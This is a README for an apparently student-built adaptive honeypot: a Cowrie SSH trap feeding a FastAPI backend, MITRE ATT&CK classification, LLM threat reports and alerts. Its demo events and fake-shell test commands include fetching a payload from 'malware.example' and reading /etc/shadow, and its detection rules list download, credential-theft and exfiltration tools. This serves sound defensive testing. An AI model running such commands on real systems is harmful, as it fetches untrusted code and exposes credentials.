# Adaptive Honeypot System

Diploma project: adaptive Cowrie-based honeypot for automated cyberattack detection, MITRE ATT&CK classification, LLM threat reports, Telegram alerts, PDF export, and dashboard visualization.

## What We Built

This repository now contains a working MVP scaffold for the thesis system:

- PostgreSQL schema in `schema.sql`.
- FastAPI backend in `backend/main.py`.
- Cowrie JSON collector in `backend/collector.py`.
- Behavior Engine in `backend/behavior_engine.py`.
- Adaptive fake filesystem layer in `backend/adaptive_layer.py`.
- IP enrichment module in `backend/ip_enrichment.py`.
- LLM threat report agent in `backend/llm_agent.py`.
- Telegram notification module in `backend/notifier.py`.
- PDF export module in `backend/pdf_export.py`.
- Minimal Next.js dashboard in `frontend/`.
- Fake Cowrie filesystem files in `cowrie/honeyfs/`.
- Docker Compose for PostgreSQL, Redis, backend, collector, and frontend.

## Project Structure

```text
.
├── schema.sql
├── docker-compose.yml
├── .env.example
├── .gitignore
├── backend/
│   ├── main.py
│   ├── collector.py
│   ├── behavior_engine.py
│   ├── adaptive_layer.py
│   ├── ip_enrichment.py
│   ├── llm_agent.py
│   ├── notifier.py
│   ├── pdf_export.py
│   ├── models.py
│   ├── schemas.py
│   ├── database.py
│   └── requirements.txt
├── frontend/
│   ├── pages/
│   ├── styles.css
│   └── package.json
├── cowrie/
│   ├── cowrie.cfg
│   └── honeyfs/
├── geoip/
└── nginx/
```

## Important Secret Rule

Do not put real API keys into `.env.example`.

Use this file only:

```text
.env
```

`.env` is ignored by git through `.gitignore`.

## Required Services

Install:

- Docker
- Docker Compose

Optional but recommended:

- DeepSeek API key for LLM reports.
- AbuseIPDB API key for IP reputation.
- Telegram bot token and chat ID for alerts.
- MaxMind GeoLite2 databases in `geoip/`.

## Environment Setup

Create local environment file:

```bash
cp .env.example .env
```

Open `.env` and fill:

```env
LLM_PROVIDER=deepseek
DEEPSEEK_API_KEY=your_deepseek_key
DEEPSEEK_BASE_URL=https://api.deepseek.com
DEEPSEEK_MODEL=deepseek-v4-pro
DEEPSEEK_REASONING_EFFORT=high
DEEPSEEK_THINKING=enabled

ABUSEIPDB_API_KEY=your_abuseipdb_key

TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_telegram_chat_id
```

If you do not have a DeepSeek key, the backend still works, but `llm_agent.py` will generate a fallback local report.

## Start The System

From project root:

```bash
docker compose up --build
```

Open:

- Backend API: `http://localhost:8000`
- API docs: `http://localhost:8000/docs`
- Dashboard: `http://localhost:3001`
- Cowrie SSH honeypot: `ssh root@localhost -p 22222`
- PostgreSQL from host: `localhost:55432`

Check backend health:

```bash
curl http://localhost:8000/health
```

Expected:

```json
{"status":"ok"}
```

## What Starts In Docker

`docker-compose.yml` starts:

- `postgres` - PostgreSQL database.
- `redis` - Redis stream backend.
- `backend` - FastAPI REST API.
- `collector` - reads Cowrie JSON logs.
- `cowrie` - SSH honeypot on host port `22222` and container port `2222`.
- `frontend` - Next.js dashboard.

Cowrie is included in the main compose file. The collector reads Cowrie logs from:

```text
/var/log/cowrie/cowrie.json
```

Inside Docker this path is shared through the `cowrie_logs` volume.

## Minimal Demo Without Real Cowrie

Use this to prove that backend, collector, database, LLM report, Telegram alert, and dashboard path work.

1. Start the stack:

```bash
docker compose up --build
```

2. In another terminal, append fake Cowrie events into the collector log:

```bash
docker compose exec collector sh -lc 'printf "%s\n" \
"{\"eventid\":\"cowrie.session.connect\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"timestamp\":\"2026-05-21T10:00:00Z\"}" \
"{\"eventid\":\"cowrie.login.failed\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"username\":\"root\",\"password\":\"123456\",\"timestamp\":\"2026-05-21T10:00:05Z\"}" \
"{\"eventid\":\"cowrie.login.success\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"username\":\"root\",\"password\":\"toor\",\"timestamp\":\"2026-05-21T10:00:12Z\"}" \
"{\"eventid\":\"cowrie.command.input\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"input\":\"wget http://malware.example/payload\",\"timestamp\":\"2026-05-21T10:00:20Z\"}" \
"{\"eventid\":\"cowrie.command.input\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"input\":\"cat /etc/shadow\",\"timestamp\":\"2026-05-21T10:00:35Z\"}" \
"{\"eventid\":\"cowrie.command.input\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"input\":\"crontab -e\",\"timestamp\":\"2026-05-21T10:00:50Z\"}" \
"{\"eventid\":\"cowrie.session.closed\",\"session\":\"demo-session-001\",\"src_ip\":\"8.8.8.8\",\"timestamp\":\"2026-05-21T10:04:23Z\"}" \
>> /var/log/cowrie/cowrie.json'
```

3. Check that the session appeared:

```bash
curl http://localhost:8000/api/sessions
```

You should see `demo-session-001`, `8.8.8.8`, risk score, severity, and current tactic.

4. Open dashboard:

```text
http://localhost:3001
```

Reload the page. The minimal dashboard should show the new session in Live Feed or Sessions.

## Generate LLM Threat Report

After `demo-session-001` exists:

```bash
curl -X POST http://localhost:8000/api/threats/demo-session-001/analyze
```

This does:

- enriches IP through AbuseIPDB if key is configured;
- sends session logs to DeepSeek if `LLM_PROVIDER=deepseek`;
- saves report into PostgreSQL;
- sends Telegram notification if severity is `HIGH` or `CRITICAL`.

View reports:

```bash
curl http://localhost:8000/api/threats
```

Open dashboard report page:

```text
http://localhost:3001/threats
```

## Test DeepSeek LLM Directly

Run this inside backend container:

```bash
docker compose exec backend python -c "import asyncio; from llm_agent import LLMAgent; agent=LLMAgent(); report=asyncio.run(agent.analyze_session({'attacker_ip':'8.8.8.8','duration_seconds':120,'login_attempts':5,'successful_login':True,'severity':'HIGH','tactic_history':[{'tactic':'MALWARE_DEPLOYMENT'}]}, [{'timestamp':'now','raw_command':'wget http://malware.example/payload','event_type':'cowrie.command.input','mitre_technique':'T1105','event_data':{}}], {'country_name':'United States','city':'Mountain View','asn':'AS15169','org_name':'Google','abuse_confidence_score':10})); print(report)"
```

If DeepSeek is configured correctly, output should be a structured JSON report. If not, you will see fallback report output or an API error in backend logs.

Backend logs:

```bash
docker compose logs -f backend
```

## Test Telegram Notification Directly

First make sure your `.env` has:

```env
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
```

Then run:

```bash
docker compose exec backend python -c "import asyncio; from notifier import TelegramNotifier; sent=asyncio.run(TelegramNotifier().send_attack_alert({'session_id':'manual-test','severity':'HIGH','mitre_techniques':[{'id':'T1105','name':'Ingress Tool Transfer'}],'ioc':{'ip':'8.8.8.8','country':'United States','abuse_score':10}})); print({'sent': sent})"
```

Expected:

```text
{'sent': True}
```

If `sent` is `False`, usually one of these is wrong:

- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_CHAT_ID`
- rate limit: one notification per minute per IP

To get `TELEGRAM_CHAT_ID`:

1. Send any message to your bot in Telegram.
2. Open:

```text
https://api.telegram.org/botYOUR_TOKEN/getUpdates
```

3. Copy:

```json
"chat": {"id": ...}
```

## Export PDF Report

Get reports:

```bash
curl http://localhost:8000/api/threats
```

Copy report `id`, then:

```bash
curl -L http://localhost:8000/api/threats/REPORT_UUID/export -o report.pdf
```

PDF files are generated by `backend/pdf_export.py`.

## Test Real Cowrie Connection

After `docker compose up --build`, connect to Cowrie:

```bash
ssh root@localhost -p 22222
```

Cowrie accepts fake credentials from `cowrie/userdb.txt`. For demo, use:

```text
username: root
password: anything
```

Run commands inside the fake shell:

```bash
whoami
uname -a
wget http://malware.example/payload
cat /etc/shadow
crontab -e
```

Then check:

```bash
curl http://localhost:8000/api/sessions
```

Open dashboard:

```text
http://localhost:3001
```

## Run With External Cowrie

The current backend expects Cowrie to write JSON logs in this format:

```json
{"eventid":"cowrie.command.input","session":"abc123","src_ip":"1.2.3.4","input":"whoami","timestamp":"2026-05-21T10:00:00Z"}
```

Real Cowrie should write:

```text
/var/log/cowrie/cowrie.json
```

You have two practical options.

### Option A: Cowrie On The Same VPS

1. Install and run Cowrie normally.
2. Configure Cowrie JSON output.
3. Mount or point collector to the real log path.
4. Make sure `.env` contains:

```env
COWRIE_JSON_LOG=/var/log/cowrie/cowrie.json
```

### Option B: Cowrie Docker Container

Run Cowrie separately and mount its log directory into the same Docker volume or host path used by the collector.

The collector only needs one thing: new JSON lines appended to:

```text
/var/log/cowrie/cowrie.json
```

Once Cowrie writes there, the rest of the pipeline works automatically:

```text
Cowrie JSON log -> collector -> PostgreSQL -> FastAPI -> dashboard
                                  |
                                  -> Behavior Engine -> Adaptive Layer
                                  -> LLM report -> Telegram/PDF
```

## API Endpoints

- `GET /health`
- `GET /api/sessions`
- `GET /api/sessions/{session_id}`
- `GET /api/stats`
- `GET /api/threats`
- `POST /api/threats/{session_id}/analyze`
- `GET /api/threats/{report_id}/export`
- `GET /api/map`
- `WS /ws/alerts`

## Database

`schema.sql` creates:

- `sessions`
- `events`
- `ip_intel`
- `threat_reports`
- `password_stats`

If schema changes and PostgreSQL volume already exists:

```bash
docker compose down -v
docker compose up --build
```

This deletes local database data, so use only during development.

## Behavior Engine Rules

The Behavior Engine detects:

- `>30 failed logins/min` -> `BRUTE_FORCE`, `T1110.001`
- `nmap`, `ifconfig`, `netstat`, `uname`, `hostname` -> `RECONNAISSANCE`
- `wget`, `curl`, `chmod +x`, `./payload` -> `MALWARE_DEPLOYMENT`
- `cat /etc/passwd`, `cat /etc/shadow`, `id`, `whoami` -> `CREDENTIAL_ACCESS`
- `crontab`, `systemctl enable`, `~/.bashrc` -> `PERSISTENCE`
- `tar`, `zip`, `scp`, `rsync` -> `EXFILTRATION`

It updates:

- `current_tactic`
- `tactic_history`
- `risk_score`
- `severity`
- `adaptation_applied`

## Useful Commands

Show running containers:

```bash
docker compose ps
```

Backend logs:

```bash
docker compose logs -f backend
```

Collector logs:

```bash
docker compose logs -f collector
```

Stop system:

```bash
docker compose down
```

Rebuild clean database:

```bash
docker compose down -v
docker compose up --build
```

## Current MVP Limitations

- Dashboard is minimal and meant for demonstration.
- Map page currently lists coordinates; full Leaflet cluster map is the next UI improvement.
- Adaptive reload is prepared in code, but real Cowrie API/reload command must be wired for production.
- Add authentication before exposing the dashboard publicly.
